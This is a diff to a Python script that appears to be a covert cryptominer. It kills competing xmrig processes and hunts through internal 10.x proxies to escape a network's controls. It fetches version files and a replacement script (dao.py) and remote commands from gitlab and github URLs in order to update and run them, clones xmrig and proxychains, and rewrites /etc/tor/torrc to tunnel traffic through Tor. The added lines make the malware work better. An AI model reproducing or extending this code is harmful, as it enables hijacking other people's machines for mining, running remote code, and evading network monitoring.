@@ -10,6 +10,7 @@ import multiprocessing
 import ast
 useproxy = 0
 proxy_error = 0
+final_proxy = ''
 os.system('chmod 777 ' + __file__)
 program = 'xmrig'
 os.system('pkill ' + program)
@@ -51,6 +52,7 @@ if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/proxy') =
     proxy = openproxy.read().strip()
     openproxy.close()
     useproxy = 1
+    readtestproxy = ''
     #openrealproxy = open(os.path.dirname(os.path.realpath(__file__)) + '/proxy1', 'r')
     #realproxy = openrealproxy.read().strip()
     #openrealproxy.close
@@ -60,8 +62,6 @@ if useproxy == 1:
     ip = arrayproxy[0].strip()
     port = arrayproxy[1].strip()
     #ip = str(ip)
-    print ip
-    print port
     #time.sleep(100000)
     opensocket = socket.socket()
     #print opensocket
@@ -74,12 +74,10 @@ if useproxy == 1:
         print 'Error connect proxy at ' + ip + ':' + port
         proxy_error = 1
     if proxy_error == 0:
-        linktestproxy = 'https://docs.google.com/uc?authuser=0&id=1aqvBEV-Ta99s_QJ-VrmVP345qG13T7kQ&export=download'
+        linktestproxy = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/proxyok'
         #linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
-        print linktestproxy
         try:
             proxytext = ast.literal_eval(realproxy)
-            print proxytext
             proxyuse = urllib2.ProxyHandler(proxytext)
             opener = urllib2.build_opener(proxyuse)
             urllib2.install_opener(opener)
@@ -108,14 +106,16 @@ if useproxy == 1:
                 proxy_error = 1
             else:
                 print 'Connected proxy at ' + ip + ':' + port
+                final_proxy = ip + ':' + str(port)
                 opensocket.close()
         else:
             print 'Connected proxy at ' + ip + ':' + port
+            final_proxy = ip + ':' + str(port)
             opensocket.close()
     if proxy_error == 1:
         proxy_error = 0
-        allproxy = ('10.33.224.211,10.29.224.211,10.30.224.235,10.53.224.212,10.37.224.30,10.32.224.39,10.16.224.7,10.1.225.4')
-        allport = ('8118,8118,8118,8118,8118,8118,8080,8080')
+        allproxy = ('10.53.224.212,10.53.224.219,10.53.224.20,10.16.224.205,10.16.224.200,10.16.224.7,10.41.226.31,10.41.224.211,10.41.224.20,10.38.224.20,10.51.224.214,10.51.224.212,10.51.224.20,10.30.224.211,10.30.224.235,10.30.224.20,10.17.224.212,10.17.224.20,10.11.226.21,10.11.224.20,10.29.224.221,10.29.224.211,10.29.224.20,10.32.224.48,10.32.224.20')
+        allport = ('8118,8118,8080,8118,8118,8080,8118,8118,8080,1961,8118,8118,8080,8118,8118,8080,8118,8080,8118,8080,8118,8118,8080,8118,8080')
         arrayallproxy = allproxy.split( ",")
         arrayallport = allport.split(",")
         for i in range(0,len(arrayallproxy),1):
@@ -124,13 +124,13 @@ if useproxy == 1:
                 connect = opensocket.connect((arrayallproxy[i], int(arrayallport[i])))
                 realproxy = "{'https': '" + arrayallproxy[i] + ":" + arrayallport[i] + "'}"
                 proxy_error = 0
-                print 'Connected proxy at ' + ip + ':' + port
+                print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
             except:
                 print 'Error connect proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                 proxy_error = 1
                 pass
             if proxy_error == 0:
-                linktestproxy = 'https://docs.google.com/uc?authuser=0&id=1aqvBEV-Ta99s_QJ-VrmVP345qG13T7kQ&export=download'
+                linktestproxy = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/proxyok'
                 # linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
                 print linktestproxy
                 try:
@@ -142,6 +142,7 @@ if useproxy == 1:
                     downloadtestproxy = urllib2.urlopen(linktestproxy)
                     readtestproxy = downloadtestproxy.read().strip()
                     print readtestproxy
+                    final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                 except:
                     pass
                 if readtestproxy <> 'proxy_ok':
@@ -166,16 +167,18 @@ if useproxy == 1:
                     else:
                         print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                         opensocket.close()
+                        final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                         break
                 else:
                     print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
+                    final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                     opensocket.close()
                     break
 if proxy_error == 1:
     useproxy = 0
 print 'Use proxy = '+ str(useproxy)
-version = '7.1'
-linkversion = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_TzZwa1hQVTBLaWc&export=download'
+version = '9.6'
+linkversion = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/versiondao'
 readversion = ''
 #linkversion = 'https://google.com'
 try:
@@ -208,6 +211,8 @@ if len(readversion) > 50 or readversion == '':
             urllib2.install_opener(opener)
         downloadversion = urllib2.urlopen(linkversion)
         readversion = downloadversion.read().strip()
+        if len(readversion) > 50 or readversion == '':
+            readversion = version
     except:
         readversion = version
         pass
@@ -215,7 +220,7 @@ if len(readversion) > 50 or readversion == '':
     print readversion
 if version != readversion:
     noidung = ''
-    linkcodedao = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_UzZBMHd6TjdwREE&export=download'
+    linkcodedao = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/dao.py'
     try:
         if useproxy == 1:
             proxytext = ast.literal_eval(realproxy)
@@ -269,7 +274,7 @@ except:
 # Update cpuminer
 versiondll = '2.8.1'
 readversiondllnew = ''
-linkversiondllnew = 'https://docs.google.com/uc?authuser=0&id=15flFHc8I0zfumXoXZWvHD8IRR5sAaIyk&export=download'
+linkversiondllnew = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/versiondllnew'
 try:
     if useproxy == 1:
         proxytext = ast.literal_eval(realproxy)
@@ -301,6 +306,8 @@ if len(readversiondllnew) > 50 or readversiondllnew == '' :
         downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
         readversiondllnew = downloadversiondllnew.read().strip()
         print readversiondllnew
+        if len(readversiondllnew) > 50 or readversiondllnew == '':
+            readversiondllnew = versiondll
     except:
         readversiondllnew = versiondll
 if readversiondllnew != versiondll:
@@ -309,7 +316,7 @@ if readversiondllnew != versiondll:
     os.system('rm -rf xmrig')
     os.system('sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libmicrohttpd-devel libuv-static')
     if useproxy == 1:
-        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + proxy + '\'')
+        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + final_proxy + '\'')
     else:
         os.system('git clone https://github.com/nhatquanglan/xmrig.git')
     # time.sleep (30)
@@ -322,8 +329,9 @@ if readversiondllnew != versiondll:
     os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
     os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
 
-linkcommand = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_QzBMOENzb2plZnM&export=download'
+linkcommand = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/command'
 command = ''
+commandread = ''
 try:
     if useproxy == 1:
         proxytext = ast.literal_eval(realproxy)
@@ -342,7 +350,7 @@ except:
     pass
 if commandread.find(program) == -1:
     print 'Download command tu google drive bi loi, thu link github'
-    linkcommand = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondllnew'
+    linkcommand = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/command_linux'
     try:
         if useproxy == 1:
             proxytext = ast.literal_eval(realproxy)
@@ -376,7 +384,7 @@ if os.path.isfile('/usr/local/bin/xmrig') == False:
     # os.system ('yum localinstall -y rpm-cli.rpm')
     # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
     if useproxy == 1:
-        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + proxy + '\'')
+        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + final_proxy + '\'')
     else:
         os.system('git clone https://github.com/nhatquanglan/xmrig.git')
     # time.sleep (30)
@@ -393,7 +401,7 @@ if os.path.isfile('/usr/local/bin/proxychains4') == False:
     # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
     if useproxy == 1:
         os.system('rm -rf proxychains-ng')
-        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git --config \'http.proxy=' + proxy + '\'')
+        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git --config \'http.proxy=' + final_proxy + '\'')
     else:
         os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git')
     # time.sleep (30)
@@ -407,6 +415,13 @@ if useproxy == 0:
 else:
     print command
     print 'starting tor'
+    open_tor_file = open('/etc/tor/torrc', 'w')
+    open_tor_file.write('DataDirectory /var/lib/tor' + '\n')
+    open_tor_file.write('SocksListenAddress 0.0.0.0' + '\n')
+    open_tor_file.write('SocksPolicy accept *' + '\n')
+    open_tor_file.write('HTTPSProxy ' + final_proxy + '\n')
+    open_tor_file.write('HTTPProxy ' + final_proxy + '\n')
+    open_tor_file.close()
     os.system('systemctl restart tor')
     time.sleep (60)
     os.system('systemctl restart tor')
